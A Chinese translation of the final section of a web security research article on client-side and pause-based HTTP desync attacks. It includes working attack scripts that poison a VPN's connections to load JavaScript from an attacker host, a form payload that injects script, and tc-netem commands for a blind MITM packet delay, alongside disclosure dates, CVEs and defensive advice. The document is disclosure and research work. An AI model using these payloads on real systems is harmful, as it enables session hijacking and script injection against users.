由于我们针对的是资源加载，并且没有投毒客户端缓存的奢侈，我们的攻击时机至关重要。我们需要受害者的浏览器成功加载目标站点上的页面，但随后使用被投毒的连接加载 JavaScript 子资源。

固有的竞争条件使此攻击不可靠，因此如果我们只有一次尝试，它注定失败——我们需要设计一个可以获得多次尝试的环境。为了实现这一点，我将创建一个单独的窗口并从攻击者页面保持对其的句柄。

在大多数目标页面上，劫持 JS 导入的失败尝试将导致浏览器缓存真实的 JavaScript 文件，使该页面对此类攻击免疫，直到缓存的 JS 过期。我通过针对 `/dana-na/meeting/meeting_testjs.cgi` 避免了这个问题，它从 `/dana-na/meeting/url_meeting/appletRedirect.js` 加载 JavaScript——而该文件实际上不存在，因此返回 404 并且不会保存在浏览器的缓存中。我还用冗长的头填充了注入的请求以缓解堆叠响应问题。

这导致以下攻击流程：

- 打开一个新窗口。
- 向目标发出无害请求以建立新连接，使时间更加一致。
- 将窗口导航到 `/meeting_testjs.cgi` 的目标页面。
- 120ms 后，使用重定向小工具创建三个被投毒的连接。
- 5ms 后，在渲染 `/meeting_testjs.cgi` 时，受害者将希望尝试导入 `/appletRedirect.js` 并被重定向到 `x.psres.net`，该站点提供恶意 JS。
- 如果没有，重试攻击。

以下是最终攻击脚本：

```html
<script>
    function reset() {
        fetch('https://vpn.redacted/robots.txt', {mode: 'no-cors', credentials: 'include'})
        .then(() => {
            x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
        })
        setTimeout(poison, 120) // 在 140 上有效，降到 110
    }

    function poison(){
        sendPoison()
        sendPoison()
        sendPoison()
        setTimeout(reset, 1000)
    }

    function sendPoison(){
        fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css', {method: 'POST', body: 'GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n', mode: 'no-cors', credentials: 'include'})
    }
</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```

这在 2022 年 1 月 24 日报告，希望在您阅读本文时已被修补。以下是攻击演示视频：

<iframe src="https://www.youtube.com/embed/eBfWGxvuo2o?origin=https://portswigger.net&rel=0" allowfullscreen="allowfullscreen"></iframe>

## 基于暂停的反同步

我们之前看到，在 HTTP 请求中间暂停并观察服务器的反应可以揭示有用的信息，这些信息无法通过篡改请求的实际内容获得。事实证明，暂停也可以通过触发有问题的请求超时实现来创造新的反同步漏洞。

除非您的工具超时时间比目标服务器长，否则此类漏洞是不可见的。我非常幸运地发现了它，因为我的工具本应有 2 秒的超时时间，但由于一个错误，它恢复到了 10 秒的超时时间。我的管道还恰好包括一个运行 Varnish 的孤立站点，配置了自定义的 5 秒超时时间。

#### Varnish

Varnish 缓存有一个名为 `synth()` 的功能，允许您在不将请求转发到后端的情况下发出响应。以下是一个用于阻止访问文件夹的示例规则：

```
if (req.url ~ "^/admin") {
    return (synth(403, "Forbidden"));
}
```

当处理与 synth 规则匹配的部分请求时，如果 15 秒内未收到数据，Varnish 将超时。当这种情况发生时，它会保持连接打开以供重用，即使它只从套接字读取了一半请求。这意味着如果客户端随后发送 HTTP 请求的后半部分，它将被解释为一个新的请求。

要在易受攻击的前端触发基于暂停的反同步，首先发送您的头部，承诺一个消息体，然后只需等待。最终您会收到一个响应，而当您最终发送请求体时，它将被解释为一个新的请求：

![暂停反同步概念](/cms/images/71/05/55dd-article-intro.png)

#### Apache

在此发现之后，我增加了 Turbo Intruder 的请求超时时间，并发现相同的技术在 Apache 上有效。与 Varnish 一样，它在服务器自行生成响应而不是让应用程序处理请求的端点上容易受到攻击。发生这种情况的一种方式是通过服务器级重定向：

```
Redirect 301 / /en
```

如果您发现一个容易受到基于暂停的反同步攻击的服务器，根据易受攻击的是前端还是后端，您有两种利用选择。

### 服务器端

如果易受攻击的服务器运行在后端，您可能能够触发服务器端反同步。为此，您需要一个能将请求流式传输到后端的前端。特别是，它需要在不缓冲整个请求体的情况下转发 HTTP 头。这是由此产生的利用流程的样子：

![服务器端暂停反同步](/cms/images/91/e7/3b33-article-basic.png)

这里有一个小问题。前端不会读取超时响应并将其传递给我们，直到它看到我们发送了一个完整的请求。因此，我们需要发送头部，暂停一段时间，然后不受提示地继续攻击序列的其余部分。我不知道有任何安全测试工具支持像这样部分延迟请求，所以我已在 Turbo Intruder 中实现了支持。队列接口现在有三个新参数：

- `pauseBefore` 指定 Turbo 应该暂停的偏移量。
- `pauseMarker` 是一个替代方案，接受一个字符串列表，Turbo 应在发出这些字符串后暂停。
- `pauseTime` 指定暂停的时间长度，以微秒为单位。

那么，哪些前端实际上具有这种请求流式传输行为？一个众所周知的前端是 Amazon 的 Application Load Balancer（ALB），但还有一个额外的问题。如果 ALB 收到对部分请求的响应，它将拒绝复用连接。

![时机不佳的暂停反同步](/cms/images/3a/08/0ffd-article-badlytimed.png)

幸运的是，此机制中存在固有的竞争条件。您可以通过将请求的后半部分延迟到刚好在前端超时的同时到达后端来利用 ALB 后面的 Varnish。

![时机良好的暂停反同步](/cms/images/35/d1/4f8c-article-welltimed.png)

#### 匹配超时时间

在利用 ALB 后面的 Apache 时还有一个额外的复杂问题——两个服务器的默认超时时间都是 60 秒。这留下了极短的时间窗口来发送请求的第二部分。

我试图通过发送一些被前端规范化掉的数据来解决这个问题，以重置前端的计时器而不影响后端的计时器。不幸的是，块大小填充、块扩展或 TCP 重复/乱序数据包都没有实现这个目标。

最后，为了证明概念，我寄希望于纯粹的机会，并使用 Turbo Intruder 发起了一次缓慢但持续的攻击。这在 66 小时后最终成功了。

### 中间人攻击驱动

由于基于暂停的反同步攻击使用合法的 HTTP 请求，很自然地会想知道它们是否可以用来触发客户端反同步。我探索了让浏览器在发出请求中途暂停的选项，但虽然[流式 Fetch](https://web.dev/fetch-upload-streaming/) 听起来很有希望，但它尚未实现，最终我没有成功。

然而，有一种方法肯定可以延迟浏览器请求——主动 MITM 攻击。TLS 旨在防止数据在传输过程中被解密或修改，但它是通过 TCP 传输的，没有什么可以阻止攻击者延迟整个数据包。这可以被称为盲 MITM 攻击，因为它不依赖于解密任何流量。

攻击流程与常规客户端反同步攻击非常相似。用户访问攻击者控制的页面，该页面向目标应用程序发出一系列跨域请求。第一个 HTTP 请求被故意填充得非常大，以至于操作系统将其拆分为多个 TCP 数据包，使主动 MITM 能够延迟最后一个数据包，从而触发基于暂停的反同步。由于填充，攻击者可以仅根据大小来识别要暂停的数据包。

![MITM 驱动的暂停反同步](/cms/images/20/35/2bac-article-mitm.png)

我能够针对一个独立的基于 Apache 的网站成功执行此攻击，该网站使用默认配置和单个重定向规则：

```
Redirect 301 /redirect /destination
```

从客户端来看，除了请求填充之外，它看起来像一个使用 HEAD 小工具的常规客户端反同步：

```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```

在执行盲 MITM 的攻击者系统上，我使用 tc-NetEm 实现了延迟：

```
# 设置
tc qdisc add dev eth0 root handle 1: prio priomap

# 标记发往 34.255.5.242 且大小在 700 到 1300 字节之间的数据包
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
    match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
    and 'cmp(u16 at 2 layer network gt 0x02bc)' \
    and 'cmp(u16 at 2 layer network lt 0x0514)' \
    flowid 1:3

# 将标记的数据包延迟 61 秒
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```

通过调整请求填充和数据包大小过滤器，我在目标浏览器上实现了约 90% 的成功率。以下是最终攻击：

<iframe src="https://www.youtube.com/embed/Kll3B3pLZB8?origin=https://portswigger.net&rel=0" allowfullscreen="allowfullscreen"></iframe>

我在 12 月 17 日报告了 Varnish 漏洞，它在 1 月 25 日被修补为 [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html)。Akamai 漏洞在同一天报告，并在 3 月 14 日被修补为 [CVE-2022-22720](https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2022-22720)。

## 结论

### 进一步研究

本文涵盖的主题和技术具有进一步研究的巨大潜力。一些突出的可取之处是：

- 用浏览器可发出的请求触发客户端反同步的新方法
- 检测基于暂停的服务器端反同步漏洞的高效可靠方法
- 更多用于客户端反同步攻击的利用小工具
- 使用 CSD 链式利用的现实世界 PoC
- 无需 MITM 即可延迟浏览器请求的方法
- 在 HTTP/2 可用时强制浏览器使用 HTTP/1 的方法
- 对 HTTP/2+ 等效攻击的探索

这份清单可能也有一些重大遗漏。

### 防御

您可以通过端到端使用 HTTP/2 来缓解本文中描述的大多数攻击。HTTP/2 中的等效缺陷是可能的，但可能性要小得多。我不建议使用支持 HTTP/2 的前端，然后将请求重写为 HTTP/1.1 与后端通信。这确实缓解了客户端反同步攻击，但未能缓解服务器端基于暂停的攻击，并且还引入了额外的威胁。

如果您公司的员工流量通过转发代理路由，请确保上游 HTTP/2 已启用。请注意，使用转发代理还会引入一系列超出本文范围的额外请求走私风险。

HTTP/1.1 的明文性质使其看起来简单得具有欺骗性，并诱使开发人员实现自己的服务器。不幸的是，即使是最简的 HTTP/1.1 实现也容易出现严重漏洞，特别是如果它支持连接复用或被部署在单独的前端后面。我认为实现自己的 HTTP 服务器等同于自己实现加密——通常是个坏主意。

当然，有些事是不可避免的。如果您发现自己正在实现 HTTP 服务器：

- 将 HTTP 请求视为独立实体——不要假设通过同一连接发送的两个请求有任何共同之处。
- 要么完全支持分块编码，要么拒绝它并重置连接。
- 永远不要假设请求不会有消息体。
- 如果在处理请求时遇到任何服务器级异常，默认丢弃连接。
- 支持 HTTP/2。

### 漏洞赏金在哪里？

本研究发表后，很多人问我是否在研究期间获得了漏洞赏金。我确实获得了，但相对于这些技术的有效性，总赏金收入非常低。这主要是因为我的研究工作重点是尽可能多地探索新技术用于我的演讲和白皮书，而不是最大化收入。例如，由于 Amazon 的漏洞赏金计划与公开研究不兼容，我放弃了大约 30,000 美元。

使用我的工具找到易受攻击的网站很简单，但创建完整的漏洞利用通常很耗时。Black Hat 前一周我有一些空闲时间，决定尝试用两个发现赚点钱。第一个花了大约 40 分钟来利用和撰写报告，获得了 13,500 美元的赏金。第二个被证明难以武器化，所以两小时后我用一个简单的 PoC 报告了它，只是证明发生了服务器端反同步，但它没有通过分类。好消息是，这种情况为漏洞赏金社区留下了大量的发现。下周我将分享一些关于将已发表的研究转化为利润的指导。

获得的总赏金为 17,500 美元，加上互联网漏洞赏金项目为 Apache 漏洞提供的[额外 4,000 美元](https://hackerone.com/reports/1667974)。像往常一样，所有赏金将捐赠给通过内部投票选择的慈善机构。

### 总结

我介绍了客户端反同步和基于暂停的反同步，并提供了用于理解它们所构成威胁的工具包、案例研究和方法论。这表明反同步攻击不能通过阻止混淆或格式错误的请求、隐藏在内部网络上或没有前端来完全避免。我们还了解到，早期读取是理解和利用黑盒部署的宝贵工具。最后，我希望我已经证明了自定义 HTTP 服务器是应该避免的。

如果您想进一步深入这个主题，我建议您使用[配套的交互式实验](https://portswigger.net/web-security/request-smuggling/browser)亲自尝试这些技术，然后获取 HTTP Request Smuggler 并扫描漏洞赏金站点以找到一些实时示例。祝您好运！

---

**标签：** [Request Smuggling](/research/request-smuggling) · [James Favourites](/research/james-kettle) · [Presentations](/research/presentations) · [Black Hat](/research/black-hat)

[← 返回所有文章](/research/articles)